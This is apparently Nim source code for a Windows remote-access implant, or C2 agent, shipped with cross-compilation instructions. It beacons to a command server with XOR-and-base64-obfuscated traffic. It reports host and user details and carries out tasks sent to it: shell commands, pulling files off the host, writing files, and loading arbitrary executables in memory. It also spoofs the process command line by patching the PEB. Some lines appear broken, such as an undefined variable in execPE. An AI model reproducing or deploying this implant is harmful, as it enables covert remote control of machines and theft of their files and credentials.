# IMPORTANT : !! Use with caution !!
# This agent is currently under development
#
# compilation :
#
# nimble install winim
# nim c --os:windows --cpu:amd64 --cc=gcc --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc --passL:-static -d:release agent.nim


import winim/lean
import std/encodings, std/streams
import os, osproc, strutils, json, httpclient, base64, times, sequtils

const c2Url = "http://127.0.0.1:8080/api"
const xorKey* = "mysecretkey"
const useragent = "Mozilla/5.0"


type
  PEB_CMDLINE_BACKUP* = object
    unicodeLen: uint16
    unicodeMax: uint16
    unicodePtr: pointer
    origCmdline: string # utf-16 (widechar)
  UNICODE_STRING {.pure.} = object
    Length: uint16
    MaximumLength: uint16
    Buffer: pointer

proc stringToWide(s: string): seq[Wchar] =
  result = @[]
  for c in s:
    result.add Wchar(ord(c))
  result.add Wchar(0)

proc wideToString(ptr: pointer, len: int): string =
  result = ""
  let wptr = cast[ptr UncheckedArray[Wchar]](ptr)
  for i in 0 ..< len:
    result.add(char(wptr[i]))


# XOR encrypt/decrypt
proc xorStr(data, key: string): string =
  result = ""
  let keyLen = key.len
  for i, c in data:
    result.add(chr(ord(c) xor ord(key[i mod keyLen])))

proc xorEncode(str: string): string =
  result = base64.encode(xorStr(str, xorKey))

proc xorDecode(str: string): string =
  result = xorStr(base64.decode(str), xorKey)



# Agent id helpers
proc getHostName*: string =
  when defined(windows):
    result = getEnv("COMPUTERNAME")
  else:
    result = getEnv("HOSTNAME")

proc getUserName*: string =
  when defined(windows):
    result = getEnv("USERNAME")
  else:
    result = getEnv("USER")

proc getProcessName*: string =
  result = getAppFilename().splitPath.tail

proc generateAgentId*: string =
  getHostName() & "_" & getUserName() & "_" & getProcessName()



# Fichier helpers
proc saveBase64File(filename, b64content: string): string =
  try:
    let data = base64.decode(b64content)
    writeFile(filename, data)
    return "Saved file: " & filename
  except Exception as e:
    return "Error: " & e.msg

proc readFileBase64(filename: string): string =
  try:
    let data = readFile(filename)
    return base64.encode(data)
  except Exception as e:
    return "Error: " & e.msg



# Payload C2 POST
proc beakon(url: string, agentId: string, host, user, procName, results: string): string =
  let payload = %*{
    "agent_id": agentId,
    "hostname": host,
    "username": user,
    "process_name": procName,
    "results": results
  }
  let encPayload = xorEncode($payload)
  var client = newHttpClient()
  try:
    let resp = client.request(
      url,
      httpMethod = HttpPost,
      body = encPayload,
      headers = newHttpHeaders({
        "User-Agent": useragent,
        "Accept": "application/json"
      })
    )
    if resp.code == Http200:
      return resp.body
    else:
      raise newException(IOError, "Server returned " & $resp.code)
  except Exception as e:
    echo "[X] Comms error: ", e.msg
    return ""



# Parsers
proc parseTaskTypeValue(task: string, taskType: var string, taskValue: var string) =
  let sep1 = task.find('\'')
  if sep1 == -1: return
  let sep2 = task.find('\'', sep1 + 1)
  if sep2 == -1: return
  taskType = task.substr(sep1 + 1, sep2-1)
  let sep3 = task.find('\'', sep2 + 1)
  if sep3 == -1: return
  let sep4 = task.find('\'', sep3 + 1)
  if sep4 == -1: return
  taskValue = task.substr(sep3+1, sep4-1)

proc handleUpload(data: string): string =
  # data = base64({ 'filename':'test.txt','content':'XXXXX' })
  let filePropsJson = base64.decode(data)
  try:
    let jsonNode = parseJson(filePropsJson)
    let fname = jsonNode["filename"].getStr()
    let contentB64 = jsonNode["content"].getStr()
    return saveBase64File(fname, contentB64)
  except Exception as e:
    return "Error parsing fileprops: " & e.msg

proc handleDownload(data: string): string =
  # data = filename
  let contentB64 = readFileBase64(data)
  let jsonProps = %*{ "filename": data, "content": contentB64 }
  let allProps = $jsonProps
  return base64.encode(allProps)




# --- PATCH/RESTORE CMDLINE (WIN64) ---
when defined(amd64):
  proc getPEB(): pointer =
    var peb: pointer
    asm """
      mov rax, gs:[0x60]
      mov `peb`, rax
    """
    return peb
else:
  proc getPEB(): pointer =
    var peb: pointer
    asm """
      mov eax, fs:[0x30]
      mov [`peb`], eax
    """
    return peb
proc patchCommandLineW(newCmd: WideCString, bak: var PEB_CMDLINE_BACKUP) =
  let peb = getPEB()
  let procParams = cast[pointer](cast[ptr uint64](cast[uint64](peb) + 0x20)[])
  let cmdLine = cast[ptr UNICODE_STRING](cast[uint64](procParams) + 0x70)
  bak.unicodeLen = cmdLine.Length 
  bak.unicodeMax = cmdLine.MaximumLength
  bak.unicodePtr = cmdLine.Buffer
  if cmdLine.Buffer != nil and cmdLine.Length  > 0:
    bak.origCmdline = wideToString(cast[pointer](cmdLine.Buffer), cmdLine.Length  div 2)
  if cmdLine.Buffer != nil:
    let srcLen = min(newCmd.len, (cmdLine.MaximumLength div 2)-1)
    copyMem(cmdLine.Buffer, newCmd, srcLen*2)
    cast[ptr wchar_t](cmdLine.Buffer)[srcLen] = 0 # NUL-term
    cmdLine.Length  = uint16(srcLen*2)

proc restoreCommandLineW(bak: PEB_CMDLINE_BACKUP) =
  var peb = cast[pointer](cast[uint64](winimLean.__readgsqword(0x60)))
  let procParams = cast[pointer](cast[ptr uint64](cast[uint64](peb) + 0x20)[])
  let cmdLine = cast[ptr UNICODE_STRING](cast[uint64](procParams) + 0x70)
  if cmdLine.Buffer != nil and bak.origCmdline.len > 0:
    let srcLen = min(bak.origCmdline.len, (cmdLine.MaximumLength div 2)-1)
    copyMem(cmdLine.Buffer, bak.origCmdline.cstring, srcLen*2)
    cast[ptr wchar_t](cmdLine.Buffer)[srcLen] = 0
    cmdLine.Length  = uint16(srcLen*2)
  cmdLine.Length  = bak.unicodeLen
  cmdLine.MaximumLength = bak.unicodeMax
  cmdLine.Buffer = bak.unicodePtr



# --- PE HELPERS --------------------------------------------------
proc getEncodedPEContent(data: string): string =
  let key = "'content':"
  var pos = data.find(key)
  pos += key.len
  pos = data.find('\'', pos)
  pos.inc
  let fin = data.find('\'', pos)
  result = data[pos ..< fin]

proc getEncodedPEArgs(data: string): string =
  let key = "'args':"
  var pos = data.find(key)
  pos += key.len
  pos = data.find('\'', pos)
  pos.inc
  let fin = data.find('\'', pos)
  result = data[pos ..< fin]


# Command execution
proc execPE*(b64pe: string): string =
  let fileProps = decode(base64_pe)
  let utf8data = decode(fileProps)
  let b64EncodedFile = getEncodedPEContent(utf8data)
  let b64EncodedArgs = getEncodedPEArgs(utf8data)
  let peBytes = decode(b64EncodedFile)
  let args = decode(b64EncodedArgs)
  var bak: PEB_CMDLINE_BACKUP
  let fakeargs = "fake_PE_name " & args
  let wargs = stringToWide(fakeargs)
  patchCommandLineW(wargs, bak)
  let peRaw = base64.decode(b64EncodedFile)
  let pb = cast[ptr byte](peRaw[0].unsafeAddr)
  let dos = cast[ptr IMAGE_DOS_HEADER](pb)
  if dos.e_magic != IMAGE_DOS_SIGNATURE:
    return "[ERR] Invalid DOS header"
  let nt = cast[ptr IMAGE_NT_HEADERS64](cast[int](pb) + dos.e_lfanew)
  if nt.Signature != IMAGE_NT_SIGNATURE:
    return "[ERR] Invalid NT signature"
  let imgsize = nt.OptionalHeader.SizeOfImage
  let hdrs = nt.OptionalHeader.SizeOfHeaders
  let imgmapped = cast[ptr byte](VirtualAlloc(nil, imgsize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE))
  if imgmapped.isNil:
    return "[ERR] VirtualAlloc failed"
  copyMem(imgmapped, pb, hdrs)
  var sect = cast[ptr IMAGE_SECTION_HEADER](cast[int](nt) + sizeof(IMAGE_NT_HEADERS64))
  for i in 0 ..< int(nt.FileHeader.NumberOfSections):
    let dptr = cast[ptr byte](cast[int](imgmapped) + sect.VirtualAddress)
    let rptr = cast[ptr byte](cast[int](pb) + sect.PointerToRawData)
    copyMem(dptr, rptr, sect.SizeOfRawData)
    sect = cast[ptr IMAGE_SECTION_HEADER](cast[int](sect) + sizeof(IMAGE_SECTION_HEADER))
  let entryAddr = cast[LPTHREAD_START_ROUTINE](cast[int](imgmapped) + nt.OptionalHeader.AddressOfEntryPoint)
  var tid: DWORD
  let hThread = CreateThread(nil, 0, entryAddr, nil, 0, addr tid)
  if hThread == 0:
    VirtualFree(imgmapped, 0, MEM_RELEASE)
    return "[ERR] CreateThread failed"
  discard WaitForSingleObject(hThread, INFINITE)
  CloseHandle(hThread)
  VirtualFree(imgmapped, 0, MEM_RELEASE)
  restoreCommandLineW(bak)
  return "[DONE] PE executed"

proc execCmdCompat(cmd: string): string =
  let (output, exitCode) = execCmdEx(cmd)
  if exitCode == 0:
    result = output
  else:
    result = "[ERROR exit code: " & $exitCode & "] " & output



# Main
proc main() =
  let agentId = generateAgentId()
  let host = getHostName()
  let user = getUserName()
  let processName = getProcessName()
  var results = ""
  while true:
    let response = beakon(c2Url, agentId, host, user, processName, results)
    if response.len == 0:
      sleep(5000)
      continue
    var taskDecoded = xorDecode(response)
    # Attend un JSON: { "task": "'cmd':'whoami'" }
    if taskDecoded.len == 0:
      sleep(5000)
      continue
    var taskType = ""
    var taskVal = ""
    try:
      let taskNode = parseJson(taskDecoded)
      if "task" in taskNode:
        let rawtask = taskNode["task"].getStr()
        parseTaskTypeValue(rawtask, taskType, taskVal)
      else:
        sleep(5000)
        continue
    except Exception:
      sleep(5000)
      continue
    results = ""
    if taskType == "cmd" and taskVal.len > 0:
      results = base64.encode(execCmdCompat(taskVal))
    elif taskType == "download" and taskVal.len > 0:
      results = handleDownload(taskVal)
    elif taskType == "upload" and taskVal.len > 0:
      results = handleUpload(taskVal)
    elif taskType == "exec-pe" and taskVal.len > 0:
      results = execPE(taskVal)
    else:
      results = ""
    sleep(5000)

main()
